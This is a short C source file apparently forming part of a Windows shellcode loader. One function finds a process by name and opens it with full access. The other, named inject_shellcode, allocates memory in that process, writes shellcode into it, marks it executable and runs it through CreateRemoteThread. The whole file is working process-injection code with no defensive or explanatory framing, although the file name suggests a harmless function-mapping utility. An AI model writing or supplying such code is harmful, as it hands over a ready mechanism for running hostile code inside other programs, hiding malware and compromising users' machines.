// RemoteFuncMapper.c
#include "RemoteFuncMapper.h"
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

HANDLE find_process(const char* name) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    HANDLE hProcess = NULL;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return NULL;
    }

    do {
        if (strcmp(pe32.szExeFile, name) == 0) {
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return hProcess;
}

void inject_shellcode(HANDLE hprocess, unsigned char* shellcode, size_t size) {
    LPVOID pRemoteCode;
    DWORD oldProtect;
    HANDLE hThread;
    pRemoteCode = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteCode == NULL) {
        return;
    }
    WriteProcessMemory(hprocess, pRemoteCode, shellcode, size, NULL);
    VirtualProtectEx(hprocess, pRemoteCode, size, PAGE_EXECUTE_READ, &oldProtect);
    hThread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    VirtualFreeEx(hprocess, pRemoteCode, 0, MEM_RELEASE);
}
